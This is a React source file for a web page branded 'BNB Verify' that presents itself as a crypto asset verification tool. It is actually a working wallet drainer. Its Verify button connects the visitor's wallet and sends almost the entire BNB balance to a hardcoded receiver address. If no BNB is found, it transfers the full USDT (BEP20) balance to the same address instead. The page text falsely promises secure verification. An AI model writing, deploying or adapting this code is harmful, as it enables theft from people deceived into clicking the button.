import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

export default function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // your wallet
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="app-container">
      <header className="navbar">
        <div className="logo">BNB Verify</div>
      </header>

      <main className="hero">
        <h1>Verify Crypto Assets</h1>
        <p>Supports BNB and USDT (BEP20) transfers securely.</p>
        <div className="verify-button-container">
          <button className="button-primary" onClick={handleVerify}>
            Verify
          </button>
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
        </div>
        <p className="status">{status}</p>
      </main>
    </div>
  );
}
